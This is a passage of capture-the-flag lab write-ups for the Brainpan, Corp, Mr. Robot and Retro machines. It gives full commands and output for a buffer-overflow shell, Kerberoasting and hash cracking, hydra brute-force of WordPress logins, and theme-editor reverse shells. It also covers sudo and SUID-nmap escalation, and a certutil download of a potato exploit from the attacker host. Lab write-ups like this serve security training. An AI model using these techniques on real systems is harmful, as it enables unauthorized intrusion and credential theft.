 Visiting the directory we can download the brainpan.exe, that is the service running on port 9999.
 The service can be crashed passing a string of 1000 characters, so let's try the usual BOF analysis locally. Even in this case BOF-Assistant help us to quickly find the exploit path.
 Then we can replicated remotely using the direct exploit mode. Just remember this is a Linux box, so choose the appropriate shell payload:

 	python3 BOF-Assistant.py  <brainpan IP> 9999 -e

 Then upgrade the shell to TTY

 	python -c 'import pty; pty.spawn("/bin/bash")'

Get linpeas from the attacker machine and run it:

 	╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
	...
	
	User puck may run the following commands on this host:
	    (root) NOPASSWD: /home/anansi/bin/anansi_util

Let's run the command:

	sudo /home/anansi/bin/anansi_util
	Usage: /home/anansi/bin/anansi_util [action]
	Where [action] is one of:
	  - network
	  - proclist
	  - manual [command]
Then we can execute the following (use which command you prefer for manual)

	sudo /home/anansi/bin/anansi_util manual cat
 Then we get a shell issuing: <b>!/bin/bash after RETURN)</b>

 	No manual entry for manual
	WARNING: terminal is not fully functional
	-  (press RETURN)!/bin/bash
	!/bin/bash
	root@brainpan:/usr/share/man# 

## Corp
If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory:

	C:\Windows\System32\spool\drivers\color
 This is whitelisted by default. 
### Kerberosting
Find SPN users

	impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.10.90.196 'CORP.local/dark:_QuejVudId6'
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	ServicePrincipalName  Name  MemberOf                                    PasswordLastSet             LastLogon                   Delegation 
	--------------------  ----  ------------------------------------------  --------------------------  --------------------------  ----------
	HTTP/fela             fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2019-10-11 05:39:12.562404             
	HOST/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2019-10-11 05:39:12.562404             
	HTTP/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2019-10-11 05:39:12.562404             

Look at the file

	cat kerberoastables.txt          
	$krb5tgs$23$*fela$CORP.LOCAL$CORP.local/fela*$b42eab1730ae3e71b54d2e881afca408$9032a61efcd2be7eb4ecde61e01bfa6a79a1907eab48dcd25869d4f975356c4c844e2517f3d6b2c6d32558f8fa828864b2ddea0be6cfe70b0ec82c59ffb0d5f4e5e8caa83e602d3f359f556e61e9b337cc60bf1aa0098e41ac33f1c195fc1c49d8d351f21...3dc4c24f64264b57705dcee043da7a1758e4

Let's proceed to brute force the ticket (I used john, since I do not have enough memory to run hashcat from the VM I'm worrking at the moment):

	john kerberoastables.txt -format=krb5tgs -wordlist=/usr/share/wordlists/rockyou.txt

 We can connect with the new credentials we found. Since we can run powershell as administrator we can find the flag on the desktop.
 Then I used winpeas64 to find priv escalation path. Remember to set the color using the following command:

 	REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
  You need to re-open the DOS shell to see the coloured output running. We found Unattend file credentials:

	╔══════════╣ Unattend Files
	C:\Windows\Panther\Unattend\Unattended.xml
	<Password>        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>        <PlainText>false</PlainText>    </Password>
  
We can decode the password as follows:

	echo dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ= | base64 --decode

## MR. Robot CTF
As usual proceed to scan the box:

	rustscan -b 900 -a 10.10.228.157
We have only to services: 80, 443

	nmap -A -sVC -p 80,443 -Pn 10.10.228.157
We have an Apache web server running, let's visit the web site and play a bit with the options to entertain us a bit :).
Nothing really helpful came out. Let's proceed to fuzz the webserver

	ffuf -u https://10.10.228.157/FUZZ -mc 200,301 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c

We discovered that the site is hosted on Wordpress, among the usual found folder there is one that hits my attention:

	robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 93ms]
Visiting we see the name of 2 files:

	fsocity.dic
	key-1-of-3.txt

Tehy files are placed in the webroot and are self-explanatory. The .dic file suggests us that we should try to brute-force the wp-login.
Since we cannot find the username using well-known user [enumertation techniques](https://gosecure.ai/blog/2021/03/16/6-ways-to-enumerate-wordpress-users/), we have to proceed to brute-foce username in first place. Since we get the following error: <b>ERROR: Invalid username.</b>, we can set up the following attack:

	hydra -L fsocity.dic -p Admin1234 10.10.228.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=https%3A%2F%2F10.10.228.157%2Fwp-admin%2F&testcookie=1:Invalid username." 

After a while we got

	...
 	[80][http-post-form] host: 10.10.228.157   login: Elliot   password: Admin1234
	...
 	[80][http-post-form] host: 10.10.228.157   login: elliot   password: Admin1234

Now we can proceed to test if a different error is returned for a wrong password. We got: <b>The password you entered for the username Elliot is incorrect</b>. So we can set up the following attack for password brute-force:

 	hydra -P fsocity.dic -l elliot 10.10.228.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=https%3A%2F%2F10.10.228.157%2Fwp-admin%2F&testcookie=1:The password you entered for the username"

 	[80][http-post-form] host: 10.10.228.157   login: elliot   password: ER28-0652

Now that we can access WP we can get a reverse shell modify the following template:

	https://10.10.228.157/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen

 Now visiting the following URL we can get a shell on our attacker machine:

 	https://10.10.228.157/404
  We are in as user daemon. In /home/robot there is a file withe the following contents:

  	robot:c3fcd3d76192e4007dfb496cca67e13b
   We can try to reverse it:
   
   	echo c3fcd3d76192e4007dfb496cca67e13b > hash.txt
    	john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                        
	....
 	abcdefghijklmnopqrstuvwxyz (?)    

Now login as robot user. In the home directory there is the second flag. Then I transfered linpeas.sh in /tmp folder, since, strange enough, we cannot write to the home folder. I found that nmap has suid permission:

	╔══════════╣ SUID - Check easy privesc, exploits and write perms
	...
 	-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
Now we can use the following nmap feauture to get a shell as root:

	
	robot@linux:/tmp$ nmap --interactive
	nmap --interactive
	
	Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
	Welcome to Interactive Mode -- press h <enter> for help

Then we can spawn a new shell as root (note that EUDI, effective user id is root):

	nmap> !sh 
	!sh
	# id
	uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)

## Retro
We have a web server and RDP connection as services:

	PORT     STATE SERVICE       VERSION
	80/tcp   open  http          Microsoft IIS httpd 10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows Server
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	|_ssl-date: 2024-05-16T10:10:23+00:00; -15s from scanner time.
	| ssl-cert: Subject: commonName=RetroWeb
	| Not valid before: 2024-05-15T09:54:27
	|_Not valid after:  2024-11-14T09:54:27
	| rdp-ntlm-info: 
	|   Target_Name: RETROWEB
	|   NetBIOS_Domain_Name: RETROWEB
	|   NetBIOS_Computer_Name: RETROWEB
	|   DNS_Domain_Name: RetroWeb
	|   DNS_Computer_Name: RetroWeb
	|   Product_Version: 10.0.14393
	|_  System_Time: 2024-05-16T10:10:18+00:00
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Fuzzing the web server

	ffuf -u http://10.10.106.56/FUZZ -mc 200,301 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c
 	...
	retro                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 354ms]

WordPress version 5.2.1 is running

	wpscan --url http://10.10.106.56/retro --api-token xxxxxxxxxxxx

 There are quite a lot of vulnerabilities returned but as often happens they are not applicable. 
 Visiting the URL

 	http://10.10.106.56/retro/?author=1
We can find the user name: <b>Wade</b>. Even in this case the login form reported an error specific for a wrong password, we can proceed to brute forcing the password:

	hydra -P /usr/share/wordlists/rockyou.txt -l Wade 10.10.106.56 http-post-form "/retro/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:The password you entered for"

It takes sometime:

	[80][http-post-form] host: 10.10.106.56   login: Wade   password: parzival
Again we are going to exploit the 404 template page in WP. This time the URL http:/10.10.106.56/404 did not work (I don't know why), so we to use the full path:

	http:/10.10.106.56/retro/wp-content/themes/90s-retro/404.php
Remember that Retro is a windows box, so you need to use a corresponding webshell. Since I had trouble to make it work, I coded a custom reverse shell that use netcat. You can get it [here](https://github.com/zinzloun/THM_WriteUP/blob/main/PT_Path_notes/Retro/rs_cert_nc.php).

I tried winpeas for privilege esclation but it hangs forever at:

	����������͹ Found SSH AGENTS Files
	File: C:\Users\All Users\Amazon\SSM\Logs\amazon-ssm-agent.log
	[#---------]  16% \

So I manually tried to find something interesting, eventually I found that SeImpersonatePrivilege is enabled.

	whoami
	nt authority\iusr

	
	whoami /priv
	
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name          Description                               State  
	======================= ========================================= =======
	SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
	SeImpersonatePrivilege  Impersonate a client after authentication Enabled
	SeCreateGlobalPrivilege Create global objects                     Enabled

Then we can try to bake some poatatoes. Get the exploit:

	certutil.exe -urlcache -f http://10.9.2.142:8000/CoercedPotato.exe cp.exe

I execute the program but nothing happens :( and I didn't got any error. Then I remembered that RDP is enabled, let's try to check if I can get in using wade credentials. Since it was possible I tried to execute the program through the GUI and I got an error about VCRUntime non present. It happened because I compiled CoercedPotato in Visual Studio without setting Code Generation -> Runtime Library = Multi-threaded (/MT), that will embed all the needed library.
Once recompiled the expolit I directly downloaded using Chrome. I thought to execute it directly in the RDP session but Wade does not have SeImpersonatePrivilege enabled (of course). So I switeched back to the reverse shell for iusr user, and fianlly we can execute the exploit:

	cp.exe -c cmd.exe
                                                                  
	   ____                            _ ____       _        _        
	  / ___|___   ___ _ __ ___ ___  __| |  _ \ ___ | |_ __ _| |_ ___  
	 | |   / _ \ / _ \ '__/ __/ _ \/ _` | |_) / _ \| __/ _` | __/ _ \ 
	 | |__| (_) |  __/ | | (_|  __/ (_| |  __/ (_) | || (_| | || (_) |
	  \____\___/ \___|_|  \___\___|\__,_|_|   \___/ \__\__,_|\__\___/ 
	                                                                  
	                                           @Hack0ura @Prepouce    
	                                                                  
	[+] RUNNING ALL KNOWN EXPLOITS.
	
	[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe \\.\pipe\jOEXkASoyEitwABki\pipe\spoolss.
	[PIPESERVER] Named pipe '\\.\pipe\jOEXkASoyEitwABki\pipe\spoolss' listening...
	
	[MS-RPRN] [*] Attempting MS-RPRN functions...
	
	[MS-RPRN] Starting RPC functions fuzzing...
	 [MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: \\127.0.0.1/pipe/jOEXkASoyEitwABki
	
	[PIPESERVER] A client connected!
	
	 ** Exploit completed **
	
	Microsoft Windows [Version 10.0.14393]
	(c) 2016 Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32>whoami
	whoami
	nt authority\system

	

 
 








	

 	
